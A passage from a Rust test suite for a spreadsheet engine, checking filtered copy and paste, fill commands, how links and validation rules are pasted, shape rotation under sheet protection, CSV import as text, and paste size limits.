    s.execute("cell.set", json!({"cell": "C2", "input": "=ROW()"})).unwrap();
    s.execute("edit.fillDown", json!({"range": "C2:C11"})).unwrap();
    assert_eq!(v(&s, "C4"), Value::Number(4.0));
    assert!(v(&s, "C3").is_empty());

    // Fill Up and Fill Right skip them too.
    let mut s = filtered();
    s.execute("edit.fillUp", json!({"range": "A2:A11"})).unwrap();
    assert_eq!(col(&s, "A"), skipped("v11"));
    let mut s = filtered();
    s.execute("range.setValues", json!({"range": "C2", "values": [["c2"], ["c3"], ["c4"]]})).unwrap();
    s.execute("edit.fillRight", json!({"range": "A2:C4"})).unwrap();
    assert_eq!([v(&s, "C2"), v(&s, "C3"), v(&s, "C4")], [Value::from("v2"), Value::from("c3"), Value::from("v4")]);
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(v(&s, "C4"), Value::from("c4"));

    // Copying the filtered range takes only the rows showing, formulas as their values; a cut
    // still moves every row.
    let mut s = filtered();
    s.execute("cell.set", json!({"cell": "C2", "input": "=ROW()"})).unwrap();
    s.execute("edit.fillDown", json!({"range": "C2:C11"})).unwrap();
    let r = s.execute("edit.copy", json!({"range": "A1:C11"})).unwrap();
    assert_eq!(
        r["text"],
        "Val	Tag	
v2	keep	2
v4	keep	4
v6	keep	6
v8	keep	8
v10	keep	10
v11	keep	11
"
    );
    s.execute("edit.paste", json!({"at": "H20"})).unwrap();
    let pasted: Vec<Value> = (20..=27).map(|r| v(&s, &format!("H{r}"))).collect();
    assert_eq!(pasted, ["Val", "v2", "v4", "v6", "v8", "v10", "v11"].map(Value::from).into_iter().chain([Value::Empty]).collect::<Vec<_>>());
    assert_eq!(v(&s, "J22"), Value::Number(4.0));
    assert!(s.doc().unwrap().wb.active().unwrap().cell(CellRef::parse("J22").unwrap()).unwrap().formula.is_none());
    let mut s = filtered();
    s.execute("edit.cut", json!({"range": "A1:B11"})).unwrap();
    s.execute("edit.paste", json!({"at": "H20"})).unwrap();
    assert_eq!(v(&s, "H22"), Value::from("v3"));

    // Rows hidden by hand (no filter) are written, as in Excel.
    let mut s = fresh();
    s.execute("range.setValues", json!({"range": "A1", "values": [["a"], ["b"], ["c"]]})).unwrap();
    s.execute("home.hideRows", json!({"rows": "2:2"})).unwrap();
    s.execute("selection.set", json!({"range": "A1:A3"})).unwrap();
    s.execute("range.fill", json!({"input": "Z"})).unwrap();
    assert_eq!(v(&s, "A2"), Value::from("Z"));
}

/// A table of ten rows (A1:B11) with a link on every value cell, four of its rows hidden by a
/// filter (3, 5, 7, 9), and a spare corner at E1 to copy from.
fn filtered_rows_with_links() -> Session {
    let mut s = s();
    let mut rows = vec![json!(["Val", "Tag"])];
    for i in 2..=11 {
        rows.push(json!([format!("v{i}"), if [3, 5, 7, 9].contains(&i) { "hide" } else { "keep" }]));
    }
    s.execute("range.setValues", json!({"range": "A1", "values": rows})).unwrap();
    s.execute("range.setValues", json!({"range": "E1", "values": [["X"]]})).unwrap();
    let sh = std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap();
    for r in 2..=11u32 {
        sh.hyperlinks
            .insert(CellRef::new(r - 1, 0), gridcraft_model::Hyperlink { target: format!("https://example.com/{r}"), tooltip: None, external: true });
    }
    s.execute("selection.set", json!({"range": "A1:B1"})).unwrap();
    s.execute("data.filter", json!({})).unwrap();
    s.execute("data.filterBy", json!({"column": "B", "values": ["keep"]})).unwrap();
    s
}

fn cell_link_target(s: &Session, cell: &str) -> Option<String> {
    s.doc().unwrap().wb.active().unwrap().hyperlinks.get(&CellRef::parse(cell).unwrap()).map(|h| h.target.clone())
}

fn cell_validation(s: &Session, cell: &str) -> Option<String> {
    let c = CellRef::parse(cell).unwrap();
    s.doc().unwrap().wb.active().unwrap().validations.iter().find(|d| d.ranges.iter().any(|r| r.contains(c))).map(|d| d.f1.clone())
}

/// Copying a filtered range packs the rows showing into one block; their links and validation
/// rules travel with them, and those of the hidden rows are left behind.
#[test]
fn filtered_copy_pastes_links_and_validation_of_the_rows_showing_only() {
    let mut s = filtered_rows_with_links();
    for (cell, source) in [("A3", "\"hidden\""), ("A4", "\"showing\""), ("A9", "\"hidden too\"")] {
        s.execute("data.validation", json!({"range": cell, "type": "list", "formula1": source})).unwrap();
    }
    s.execute("edit.copy", json!({"range": "A1:B11"})).unwrap();
    s.execute("edit.paste", json!({"at": "H20"})).unwrap();
    let links: Vec<Option<String>> = (20..=26).map(|r| cell_link_target(&s, &format!("H{r}"))).collect();
    let expected: Vec<Option<String>> =
        [None, Some(2u32), Some(4), Some(6), Some(8), Some(10), Some(11)].iter().map(|n| n.map(|n| format!("https://example.com/{n}"))).collect();
    assert_eq!(links, expected);
    let rules: Vec<Option<String>> = (20..=26).map(|r| cell_validation(&s, &format!("H{r}"))).collect();
    assert_eq!(rules, [None, None, Some("\"showing\"".to_string()), None, None, None, None]);
    // The source keeps its own links and rules where they were.
    assert_eq!(cell_link_target(&s, "A3").as_deref(), Some("https://example.com/3"));
    assert_eq!(cell_validation(&s, "A3").as_deref(), Some("\"hidden\""));
}

/// One cell pasted over a filtered column leaves the rules of the rows the filter hides alone, and
/// does not give them the copied rule, with or without Skip Blanks.
#[test]
fn single_row_paste_over_filtered_rows_leaves_their_validation_alone() {
    for skip_blanks in [false, true] {
        let mut s = filtered_rows_with_links();
        s.execute("data.validation", json!({"range": "E1", "type": "list", "formula1": "\"copied\""})).unwrap();
        s.execute("data.validation", json!({"range": "A2:A5", "type": "list", "formula1": "\"old\""})).unwrap();
        s.execute("edit.copy", json!({"range": "E1"})).unwrap();
        s.execute("selection.set", json!({"range": "A2:A11"})).unwrap();
        s.execute("edit.pasteSpecial", json!({"what": "all", "skipBlanks": skip_blanks})).unwrap();
        let rules: Vec<Option<String>> = (2..=11).map(|r| cell_validation(&s, &format!("A{r}"))).collect();
        let showing = Some("\"copied\"".to_string());
        let old = Some("\"old\"".to_string());
        assert_eq!(
            rules,
            [showing.clone(), old.clone(), showing.clone(), old, showing.clone(), None, showing.clone(), None, showing.clone(), showing],
            "skip blanks: {skip_blanks}"
        );
    }
}

/// Insert Copied Cells after a filtered copy of whole rows makes room for the rows copied, not for
/// the rows that were selected.
#[test]
fn insert_copied_cells_after_a_filtered_row_copy_inserts_only_the_rows_showing() {
    let mut s = filtered_rows_with_links();
    s.execute("cell.set", json!({"cell": "A30", "input": "below"})).unwrap();
    s.execute("edit.copy", json!({"range": "1:11"})).unwrap();
    s.execute("selection.set", json!({"range": "A20"})).unwrap();
    s.execute("home.insertCopiedCells", json!({})).unwrap();
    // Seven rows were copied (the header and six rows showing).
    assert_eq!(v(&s, "A37"), Value::from("below"));
    assert_eq!(v(&s, "A20"), Value::from("Val"));
    assert_eq!(v(&s, "A26"), Value::from("v11"));
    assert_eq!(v(&s, "A27"), Value::Empty);
}

/// Copying a filtered range with many separate runs of rows showing moves each row's note, link and
/// merge with it, and leaves the hidden rows' behind.
#[test]
fn filtered_copy_with_many_runs_moves_notes_and_merges_with_their_rows() {
    let mut s = s();
    let mut rows = vec![json!(["Val", "Tag"])];
    for i in 2..=2001 {
        rows.push(json!([format!("v{i}"), if i % 2 == 1 { "hide" } else { "keep" }]));
    }
    s.execute("range.setValues", json!({"range": "A1", "values": rows})).unwrap();
    let sh = std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap();
    for r in 2..=2001u32 {
        let note = gridcraft_model::Comment {
            author: "a".into(),
            text: format!("note {r}"),
            replies: vec![],
            threaded: false,
            resolved: false,
            visible: false,
            dates: vec![],
            note_box: None,
        };
        sh.comments.insert(CellRef::new(r - 1, 0), note);
    }
    sh.merges.push(gridcraft_core::RangeRef::new(CellRef::new(3, 1), CellRef::new(3, 2)));
    sh.merges.push(gridcraft_core::RangeRef::new(CellRef::new(2, 1), CellRef::new(2, 2)));
    s.execute("selection.set", json!({"range": "A1:B1"})).unwrap();
    s.execute("data.filter", json!({})).unwrap();
    s.execute("data.filterBy", json!({"column": "B", "values": ["keep"]})).unwrap();
    s.execute("edit.copy", json!({"range": "A1:C2001"})).unwrap();
    s.execute("edit.paste", json!({"at": "H1"})).unwrap();
    let sh = s.doc().unwrap().wb.active().unwrap();
    let note = |row: u32| sh.comments.get(&CellRef::new(row - 1, 7)).map(|c| c.text.clone());
    assert_eq!(note(1), None);
    assert_eq!(note(2).as_deref(), Some("note 2"));
    assert_eq!(note(3).as_deref(), Some("note 4"));
    assert_eq!(note(1001).as_deref(), Some("note 2000"));
    assert_eq!(sh.comments.keys().filter(|c| c.col == 7).count(), 1000);
    // Only the merge on a row showing (row 4) came along, packed to the row it landed in (row 3).
    assert!(sh.merges.contains(&gridcraft_core::RangeRef::new(CellRef::new(2, 8), CellRef::new(2, 9))));
    assert_eq!(sh.merges.iter().filter(|m| m.start.col >= 7).count(), 1);
}

#[test]
fn object_move_refuses_to_rotate_ink() {
    let mut s = s();
    let id = s.execute("draw.stroke", json!({"points": [[0, 0], [30, 20], [60, 5]]})).unwrap()["shape"].clone();
    assert!(s.execute("object.move", json!({"kind": "shape", "id": id, "rotation": 45})).is_err());
    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[0].rotation, 0.0);
}

#[test]
fn object_move_rotates_shapes_only() {
    let mut s = s();
    let id = s.execute("insert.shape", json!({"kind": "rectangle"})).unwrap()["shape"].clone();
    s.execute("object.move", json!({"kind": "shape", "id": id, "rotation": -30})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[0].rotation, 330.0);
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[0].rotation, 0.0);
    s.execute("selection.set", json!({"range": "A1"})).unwrap();
    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
    let chart = s.execute("insert.chart", json!({"type": "column"})).unwrap()["chart"].clone();
    assert!(s.execute("object.move", json!({"kind": "chart", "id": chart, "rotation": 45})).is_err());
}

#[test]
fn object_move_rotation_respects_sheet_protection() {
    let mut s = s();
    let id = s.execute("insert.shape", json!({"kind": "rectangle", "at": "A1"})).unwrap()["shape"].clone();
    let id_num = id.as_u64().unwrap() as u32;
    let shape_state = |session: &Session| {
        let doc = session.doc().unwrap();
        let shape = doc.wb.active().unwrap().shapes.iter().find(|shape| shape.id == id_num).unwrap();
        (shape.anchor, shape.rotation)
    };

    // Rotation remains available on an unprotected sheet.
    s.execute("object.move", json!({"kind": "shape", "id": id_num, "at": "B2", "rotation": 45})).unwrap();
    let (anchor, rotation) = shape_state(&s);
    assert_eq!(rotation, 45.0);
    assert_eq!(anchor.cell, CellRef::parse("B2").unwrap());
    s.execute("edit.undo", json!({})).unwrap();

    s.execute("review.protectSheet", json!({})).unwrap();
    let before = shape_state(&s);
    let undo_len = s.doc().unwrap().undo.len();

    let result = s.execute("object.move", json!({"kind": "shape", "id": id_num, "at": "C3", "rotation": 90}));
    assert!(result.is_err(), "rotation should be rejected on a protected sheet");
    assert_eq!(shape_state(&s), before, "a rejected rotation leaves the shape unchanged");
    assert_eq!(s.doc().unwrap().undo.len(), undo_len);
}

#[test]
fn editing_quote_prefixed_text_keeps_it_text() {
    let mut s = s();
    for (i, input) in ["'00123", "'=1+1", "'TRUE", "''abc"].iter().enumerate() {
        let cell = format!("A{}", i + 1);
        s.execute("cell.set", json!({"cell": cell, "input": input})).unwrap();
        let at = CellRef::parse(&cell).unwrap();
        let before = v(&s, &cell);
        let edit = {
            let d = s.doc().unwrap();
            crate::display::edit_text(&d.wb, d.wb.active().unwrap(), at)
        };
        assert_eq!(&edit, input, "edit text of {cell}");
        // Committing the editor unchanged leaves the cell as it was.
        s.execute("cell.set", json!({"cell": cell, "input": edit})).unwrap();
        assert_eq!(v(&s, &cell), before, "{cell}");
    }
    // Plain text is shown as typed, without a prefix.
    s.execute("cell.set", json!({"cell": "B1", "input": "hello"})).unwrap();
    let d = s.doc().unwrap();
    assert_eq!(crate::display::edit_text(&d.wb, d.wb.active().unwrap(), CellRef::parse("B1").unwrap()), "hello");
}

#[test]
fn csv_as_text_keeps_identifier_columns_as_written() {
    let csv = "gtin,zip,flag,day\n8435392892278,01234,TRUE,2026-03-04\n";
    let open = |s: &mut Session, extra: serde_json::Value| {
        let mut p = json!({"name": "feed.csv", "base64": crate::io::base64_encode(csv.as_bytes())});
        if let (Some(p), Some(extra)) = (p.as_object_mut(), extra.as_object()) {
            p.extend(extra.clone());
        }
        s.execute("file.open", p).unwrap();
    };
    let value = |s: &mut Session, cell: &str| s.execute("cell.get", json!({"cell": cell})).unwrap()["value"].clone();
    // By default fields are typed like typed input: the leading zero is lost and the GTIN is a number.
    let mut s = s();
    open(&mut s, json!({}));
    assert!(value(&mut s, "A2").is_number());
    assert_eq!(value(&mut s, "B2").as_f64(), Some(1234.0));
    // With csvAsText every field stays the text the file holds, and saves back unchanged.
    let mut s = self::s();
    open(&mut s, json!({"csvAsText": true}));
    for (cell, text) in [("A2", "8435392892278"), ("B2", "01234"), ("C2", "TRUE"), ("D2", "2026-03-04")] {
        assert_eq!(value(&mut s, cell), json!(text), "{cell}");
    }
    let saved = s.execute("file.saveBytes", json!({"format": "csv"})).unwrap();
    assert_eq!(crate::io::base64_decode(saved["base64"].as_str().unwrap()).unwrap(), csv.replace('\n', "\r\n").as_bytes());
}

fn validation_areas(s: &Session) -> Vec<String> {
    let sh = s.doc().unwrap().wb.active().unwrap();
    let mut out: Vec<String> = sh.validations.iter().map(|dv| dv.ranges.iter().map(|r| r.a1()).collect::<Vec<_>>().join(" ")).collect();
    out.sort();
    out
}

/// ft-3ir.10.16: pasting whole columns walked every one of their 1,048,576 rows and added one
/// single-cell validation rule per pasted cell, re-cutting every rule each time (the fuzz run
/// aborted on a 34 GB allocation). Validation now pastes as ranges and only cells that hold
/// something are visited.
#[test]
fn whole_column_paste_with_validation_works_on_ranges() {
    let mut s = s();
    let ok = |s: &mut Session, cell: &str, input: &str| s.execute("data.validate", json!({"cell": cell, "input": input})).unwrap()["ok"] == true;
    s.execute("cell.set", json!({"cell": "C1", "input": "1"})).unwrap();
    s.execute("cell.set", json!({"cell": "D1048576", "input": "2"})).unwrap();
    s.execute("cell.set", json!({"cell": "F100", "input": "old"})).unwrap();
    s.execute("data.validation", json!({"range": "C:C", "type": "whole", "operator": "greater", "formula1": "0"})).unwrap();
    s.execute("data.validation", json!({"range": "F:H", "type": "list", "formula1": "\"a,b\""})).unwrap();
    s.execute("edit.copy", json!({"range": "C:D"})).unwrap();
    s.execute("edit.paste", json!({"at": "F1"})).unwrap();
    assert_eq!(v(&s, "F1"), Value::Number(1.0));
    assert_eq!(v(&s, "G1048576"), Value::Number(2.0));
    assert_eq!(v(&s, "F100"), Value::Empty, "the whole column is replaced, below the copied text too");
    // One rule per copied rule, over whole columns; G (D had no rule) has none; H keeps the list.
    assert_eq!(validation_areas(&s), ["C:C", "F:F", "H:H"]);
    assert!(!ok(&mut s, "F500", "-1"));
    assert!(ok(&mut s, "G500", "anything"));
    assert!(!ok(&mut s, "H500", "c"));
    assert_eq!(s.doc().unwrap().selection.a1(), "F:G");
    // Undo gives the list back over F:H.
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(validation_areas(&s), ["C:C", "F:H"]);
    assert_eq!(v(&s, "F100"), Value::Text("old".into()));
}

/// Paste Link of whole columns links the cells the columns hold, wherever they start.
#[test]
fn paste_link_of_whole_columns_links_the_used_rows() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "C5", "input": "1"})).unwrap();
    s.execute("cell.set", json!({"cell": "C6", "input": "2"})).unwrap();
    s.execute("edit.copy", json!({"range": "C:C"})).unwrap();
    s.execute("edit.pasteSpecial", json!({"what": "all", "link": true, "at": "F1"})).unwrap();
    assert_eq!(v(&s, "F1"), Value::Number(0.0), "a link to a blank cell reads 0");
    assert_eq!(v(&s, "F5"), Value::Number(1.0));
    assert_eq!(v(&s, "F6"), Value::Number(2.0));
    assert_eq!(s.execute("cell.get", json!({"cell": "F5"})).unwrap()["input"], json!("=C5"));
}

/// A transposed paste clears the destination cells that line up with blank source cells.
#[test]
fn transposed_paste_clears_destination_cells_under_blank_source_cells() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
    s.execute("cell.set", json!({"cell": "A2", "input": "3"})).unwrap();
    s.execute("cell.set", json!({"cell": "B2", "input": "4"})).unwrap();
    s.execute("cell.set", json!({"cell": "E2", "input": "old"})).unwrap();
    s.execute("cell.set", json!({"cell": "F1", "input": "older"})).unwrap();
    s.execute("edit.copy", json!({"range": "A1:B2"})).unwrap();
    s.execute("edit.pasteSpecial", json!({"what": "all", "transpose": true, "at": "E1"})).unwrap();
    assert_eq!(v(&s, "E1"), Value::Number(1.0));
    assert_eq!(v(&s, "E2"), Value::Empty, "B1 was blank");
    assert_eq!(v(&s, "F1"), Value::Number(3.0));
    assert_eq!(v(&s, "F2"), Value::Number(4.0));
}

/// A copy tiled over a larger selection clears the non-blank destination cells under its blanks,
/// in every tile.
#[test]
fn tiled_paste_clears_destination_cells_under_blank_source_cells() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
    s.execute("cell.set", json!({"cell": "C2", "input": "x"})).unwrap();
    s.execute("cell.set", json!({"cell": "C4", "input": "y"})).unwrap();
    s.execute("edit.copy", json!({"range": "A1:A2"})).unwrap();
    s.execute("selection.set", json!({"range": "C1:C4"})).unwrap();
    s.execute("edit.paste", json!({})).unwrap();
    assert_eq!(v(&s, "C1"), Value::Number(1.0));
    assert_eq!(v(&s, "C2"), Value::Empty);
    assert_eq!(v(&s, "C3"), Value::Number(1.0));
    assert_eq!(v(&s, "C4"), Value::Empty);
}

/// #3934: a row copied into a taller, narrower selection repeats down every selected row at the
/// copy's width, as in Excel; a column copied into a wider, shorter one repeats across.
#[test]
fn paste_into_a_narrower_selection_repeats_the_copy_down_its_rows() {
    for dest in ["A3:A6", "A3:B6"] {
        let mut s = s();
        s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2]]})).unwrap();
        s.execute("edit.copy", json!({"range": "A1:B1"})).unwrap();
        s.execute("selection.set", json!({"range": dest})).unwrap();
        let r = s.execute("edit.paste", json!({})).unwrap();
        assert_eq!(r["pasted"], json!("A3:B6"), "{dest}");
        for row in 3..=6 {
            assert_eq!(v(&s, &format!("A{row}")), Value::Number(1.0), "{dest} row {row}");
            assert_eq!(v(&s, &format!("B{row}")), Value::Number(2.0), "{dest} row {row}");
        }
        assert_eq!(v(&s, "A2"), Value::Empty);
        assert_eq!(v(&s, "A7"), Value::Empty);
    }
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2]]})).unwrap();
    s.execute("edit.copy", json!({"range": "A1:A2"})).unwrap();
    s.execute("selection.set", json!({"range": "C1:F1"})).unwrap();
    let r = s.execute("edit.paste", json!({})).unwrap();
    assert_eq!(r["pasted"], json!("C1:F2"));
    for col in ["C", "D", "E", "F"] {
        assert_eq!(v(&s, &format!("{col}1")), Value::Number(1.0), "{col}1");
        assert_eq!(v(&s, &format!("{col}2")), Value::Number(2.0), "{col}2");
    }
}

/// #3934: repeating a wide copy down a narrow selection writes the copy's width on every row, so
/// the 4,000,000-cell limit on a tiled paste counts that area, not the selection's. Past it the
/// copy is pasted once, as a tiled paste over too large a selection already is.
#[test]
fn a_row_repeated_down_a_narrow_selection_is_bounded_by_the_area_it_fills() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1]]})).unwrap();
    s.execute("range.setValues", json!({"range": "P1", "values": [[2]]})).unwrap();
    s.execute("edit.copy", json!({"range": "A1:P1"})).unwrap();
    // 300,000 rows selected, 4,800,000 cells once the copy's 16 columns are repeated down them.
    s.execute("selection.set", json!({"range": "A3:A300002"})).unwrap();
    let r = s.execute("edit.paste", json!({})).unwrap();
    assert_eq!(r["pasted"], json!("A3:P3"));
    assert_eq!(v(&s, "P3"), Value::Number(2.0));
    assert_eq!(v(&s, "A4"), Value::Empty);
}

/// Excel refuses a paste that would run off the sheet rather than pasting part of it: whole
/// columns below row 1, whole rows right of column A, a whole column transposed, or a block at
/// the last row or column.
#[test]
fn paste_that_does_not_fit_on_the_sheet_is_refused() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "C1", "values": [[1, 2], [3, 4]]})).unwrap();
    s.execute("cell.set", json!({"cell": "A15", "input": "x"})).unwrap();
    let before = s.doc().unwrap().wb.clone();
    s.execute("edit.copy", json!({"range": "C:D"})).unwrap();
    assert!(s.execute("edit.paste", json!({"at": "B8"})).is_err());
    assert!(s.execute("edit.pasteSpecial", json!({"what": "all", "transpose": true, "at": "A1"})).is_err());
    s.execute("edit.copy", json!({"range": "15:15"})).unwrap();
    assert!(s.execute("edit.paste", json!({"at": "AN17"})).is_err());
    s.execute("edit.copy", json!({"range": "C1:D2"})).unwrap();
    assert!(s.execute("edit.paste", json!({"at": "XFD1"})).is_err());
    assert!(s.execute("edit.paste", json!({"at": "A1048576"})).is_err());
    s.execute("edit.cut", json!({"range": "C1:D2"})).unwrap();
    assert!(s.execute("edit.paste", json!({"at": "XFD1"})).is_err());
    let after = s.doc().unwrap().wb.clone();
    assert_eq!(after.active().unwrap().cells.len(), before.active().unwrap().cells.len());
    assert_eq!(v(&s, "C1"), Value::Number(1.0));
    // Whole rows still paste at column A, whole columns at row 1.
    s.execute("edit.copy", json!({"range": "15:15"})).unwrap();
    s.execute("edit.paste", json!({"at": "A20"})).unwrap();
    assert_eq!(v(&s, "A20"), Value::Text("x".into()));
}

/// Paste visits only cells that hold something on either side: a blank copied cell still clears
/// (or reformats) a destination cell that holds something, and blank onto blank stays blank, even
/// with an operation (Excel leaves it empty rather than writing 0).
#[test]
fn paste_blank_cells_clear_destination_and_blank_onto_blank_stays_blank() {
    let mut s = s();
    let has_cell = |s: &Session, a: &str| s.doc().unwrap().wb.active().unwrap().cell(CellRef::parse(a).unwrap()).is_some();
    s.execute("cell.set", json!({"cell": "A1", "input": "5"})).unwrap();
    s.execute("cell.set", json!({"cell": "D2", "input": "7"})).unwrap();
    s.execute("edit.copy", json!({"range": "A1:A3"})).unwrap();
    s.execute("edit.pasteSpecial", json!({"what": "values", "operation": "add", "at": "D1"})).unwrap();
    assert_eq!(v(&s, "D1"), Value::Number(5.0));
    assert_eq!(v(&s, "D2"), Value::Number(7.0));
    assert!(!has_cell(&s, "D3"), "blank + blank stays blank");
    s.execute("cell.set", json!({"cell": "F2", "input": "old"})).unwrap();
    s.execute("edit.paste", json!({"at": "F1"})).unwrap();
    assert_eq!(v(&s, "F1"), Value::Number(5.0));
    assert!(!has_cell(&s, "F2"), "a blank copied cell clears the destination");
    s.execute("home.bold", json!({"range": "H2"})).unwrap();
    assert!(has_cell(&s, "H2"));
    s.execute("edit.pasteSpecial", json!({"what": "formats", "at": "H1"})).unwrap();
    assert!(!has_cell(&s, "H2"), "a blank copied cell's format replaces the bold");
}

/// Validation pastes over the whole pasted area (a blank copied cell's rule included, as Excel
/// does), and cuts only the pasted cells out of a rule the block lands inside.
#[test]
fn paste_validation_covers_the_pasted_area_as_ranges() {
    let mut s = s();
    let ok = |s: &mut Session, cell: &str, input: &str| s.execute("data.validate", json!({"cell": cell, "input": input})).unwrap()["ok"] == true;
    s.execute("cell.set", json!({"cell": "A1", "input": "5"})).unwrap();
    s.execute("cell.set", json!({"cell": "A3", "input": "6"})).unwrap();
    s.execute("data.validation", json!({"range": "A1:A3", "type": "whole", "operator": "greater", "formula1": "0"})).unwrap();
    s.execute("data.validation", json!({"range": "D1:D3", "type": "list", "formula1": "\"x,y\""})).unwrap();
    s.execute("edit.copy", json!({"range": "A1:A3"})).unwrap();
    s.execute("edit.pasteSpecial", json!({"what": "all", "skipBlanks": true, "at": "D1"})).unwrap();
    assert!(!ok(&mut s, "D2", "-1"), "the blank copied cell's rule is pasted too");
    assert!(ok(&mut s, "D2", "3"));
    assert_eq!(validation_areas(&s), ["A1:A3", "D1:D3"]);

    // A block with a rule on its middle cells pasted inside a bigger list rule.
    let mut s = self::s();
    s.execute("data.validation", json!({"range": "A2:A3", "type": "whole", "operator": "greater", "formula1": "0"})).unwrap();
    s.execute("data.validation", json!({"range": "C1:E10", "type": "list", "formula1": "\"p,q\""})).unwrap();
    s.execute("edit.copy", json!({"range": "A1:A4"})).unwrap();
    s.execute("edit.paste", json!({"at": "D4"})).unwrap();
    assert_eq!(validation_areas(&s), ["A2:A3", "C1:E3 C4:C7 E4:E7 C8:E10", "D5:D6"]);
    assert!(ok(&mut s, "D4", "anything"));
    assert!(!ok(&mut s, "D5", "-1"));
    assert!(!ok(&mut s, "D3", "z"));

    // One copied cell tiled over a selection is one rule over the selection.
    s.execute("edit.copy", json!({"range": "A2"})).unwrap();
    s.execute("selection.set", json!({"range": "G1:G4"})).unwrap();
    s.execute("edit.paste", json!({})).unwrap();
    assert!(validation_areas(&s).contains(&"G1:G4".to_string()));
}

/// Paste Special > Validation, checked against Excel 16.0: A1 has a list rule, A2 is blank with a
/// whole-number rule, A3 is blank with no rule, over C1:C3 that hold a decimal rule. With Skip
/// Blanks a blank source cell that has a rule still pastes it, and one without keeps the
/// destination's rule; without it the destination's rule is cleared.
#[test]
fn paste_validation_skip_blanks_keeps_rules_under_blank_cells_without_one() {
    let ok = |s: &mut Session, cell: &str, input: &str| s.execute("data.validate", json!({"cell": cell, "input": input})).unwrap()["ok"] == true;
    for skip in [true, false] {
        let mut s = s();
        s.execute("data.validation", json!({"range": "A1", "type": "list", "formula1": "\"x,y\""})).unwrap();
        s.execute("data.validation", json!({"range": "A2", "type": "whole", "operator": "greater", "formula1": "0"})).unwrap();
        s.execute("data.validation", json!({"range": "C1:C3", "type": "decimal", "operator": "greater", "formula1": "0"})).unwrap();
        s.execute("edit.copy", json!({"range": "A1:A3"})).unwrap();
        s.execute("edit.pasteSpecial", json!({"what": "validation", "skipBlanks": skip, "at": "C1"})).unwrap();
        assert!(!ok(&mut s, "C1", "z"), "C1 gets A1's list rule (skip {skip})");
        assert!(!ok(&mut s, "C2", "1.5"), "C2 gets A2's whole-number rule (skip {skip})");
        assert_eq!(ok(&mut s, "C3", "-1"), !skip, "C3 keeps its decimal rule only when blanks are skipped");
    }
}

/// A big populated Skip Blanks validation paste is not refused for its cell count: only
/// validation areas are limited, and with no rule under the paste nothing is cleared.
#[test]
fn paste_validation_skip_blanks_large_populated_paste() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1:A100002", "values": (0..100_002).map(|i| vec![i]).collect::<Vec<_>>()})).unwrap();
    s.execute("edit.copy", json!({"range": "A1:A100002"})).unwrap();
    s.execute("edit.pasteSpecial", json!({"what": "validation", "skipBlanks": true, "at": "C1"})).unwrap();
    assert!(validation_areas(&s).is_empty());

    // A destination rule is cleared under every populated source cell. Count the resulting
    // coalesced ranges, not the 100,002 cells that were considered for clearing.
    let mut s = self::s();
    s.execute("range.setValues", json!({"range": "A1:A100002", "values": (0..100_002).map(|i| vec![i]).collect::<Vec<_>>()})).unwrap();
    s.execute("data.validation", json!({"range": "C1:C100002", "type": "list", "formula1": "\"x,y\""})).unwrap();
    s.execute("edit.copy", json!({"range": "A1:A100002"})).unwrap();
    s.execute("edit.pasteSpecial", json!({"what": "validation", "skipBlanks": true, "at": "C1"})).unwrap();
    assert!(validation_areas(&s).is_empty());
}

/// A whole-column copy of a filtered range takes only the rows showing, also when they form one
/// block (the hidden rows are all at the end) and the selection covers the whole column.
#[test]
fn whole_column_copy_of_a_filtered_range_leaves_the_hidden_rows_out() {
    for hidden_tail in [false, true] {
        let mut s = s();
        let mut rows = vec![json!(["Val", "Tag"])];
        for i in 2..=11 {
            let hide = if hidden_tail { i >= 8 } else { [3, 5, 7, 9].contains(&i) };
            rows.push(json!([format!("v{i}"), if hide { "hide" } else { "keep" }]));
        }
        s.execute("range.setValues", json!({"range": "A1", "values": rows})).unwrap();
        s.execute("selection.set", json!({"range": "A1:B1"})).unwrap();
        s.execute("data.filter", json!({})).unwrap();
        s.execute("data.filterBy", json!({"column": "B", "values": ["keep"]})).unwrap();
        s.execute("cell.set", json!({"cell": "H30", "input": "old"})).unwrap();
        s.execute("edit.copy", json!({"range": "A:B"})).unwrap();
        s.execute("edit.paste", json!({"at": "H1"})).unwrap();
        let col: Vec<Value> = (1..=11).map(|r| v(&s, &format!("H{r}"))).collect();
        let want: Vec<&str> =
            if hidden_tail { vec!["Val", "v2", "v3", "v4", "v5", "v6", "v7"] } else { vec!["Val", "v2", "v4", "v6", "v8", "v10", "v11"] };
        let want: Vec<Value> = want.into_iter().map(Value::from).chain(std::iter::repeat(Value::Empty)).take(11).collect();
        assert_eq!(col, want, "hidden rows stay out of a whole-column copy (hidden tail: {hidden_tail})");
    }
}

/// Open a workbook by path, and `CELL("filename")` names the file it came from, as Excel does;
/// Save As makes the new file the one it names. The sheet-name formula of #1489 depends on it.
#[test]
#[cfg(not(target_arch = "wasm32"))]
fn cell_filename_follows_the_file_the_workbook_lives_in() {
    let nonce = unique_nonce();
    let dir = std::env::temp_dir().join(format!("gridcraft-cellname-{}-{nonce}", std::process::id()));
    std::fs::create_dir(&dir).unwrap();
    let name = "=CELL(\"filename\",A1)";
    let sheet_of = "=MID(CELL(\"filename\",A1),FIND(\"]\",CELL(\"filename\",A1))+1,31)";

    // A new workbook has no file: empty, and the sheet-name formula cannot work yet.
    let mut fresh = s();
    fresh.execute("cell.set", json!({"cell": "A1", "input": name})).unwrap();
    fresh.execute("cell.set", json!({"cell": "A2", "input": sheet_of})).unwrap();
    assert_eq!(v(&fresh, "A1"), Value::from(""));
    assert_eq!(v(&fresh, "A2"), Value::Error(gridcraft_core::CellError::Value));

